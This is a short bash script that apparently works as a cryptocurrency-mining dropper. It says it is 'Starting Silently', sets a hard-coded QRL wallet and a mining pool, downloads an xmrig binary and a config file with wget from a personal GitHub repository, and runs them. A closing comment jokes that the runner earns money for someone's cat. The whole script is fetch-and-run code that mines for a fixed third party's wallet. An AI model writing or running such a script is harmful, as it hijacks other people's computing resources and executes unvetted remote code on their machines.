#!/bin/bash
echo "Welcome to R* Miner. Starting Silently.."

# Miner Config

minerwallet=Q010500f8886cf9ce0ad1381278ce81a3e22888a6b31d70955901459069519a66cc058f3199c338
qrt=us2.qrl.herominers.com:1166

# Getting the Miner and running it
wget https://github.com/mysterek1337/testxmr/raw/main/xmrig
wget https://raw.githubusercontent.com/mysterek1337/testxmr/main/config.json

chmod +x xmrig

./xmrig --config config.json
# GGs. Now you can earn money for AttestedAtom's cat.
